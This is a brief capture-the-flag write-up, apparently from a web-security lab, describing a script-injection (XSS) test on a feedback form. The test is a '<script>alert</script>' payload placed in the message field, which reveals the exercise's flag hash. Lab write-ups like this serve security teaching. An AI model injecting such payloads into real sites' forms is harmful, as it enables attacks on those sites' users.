# feedback

We go to `/?page=feedback`. We see input boxes prompting us to leave a feedback.

We try to launch an XSS attack. We enter a random `name` and write in the `message` section :

```
<script>alert</script>
```

It works ! The page displays the flag :

```
0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
```
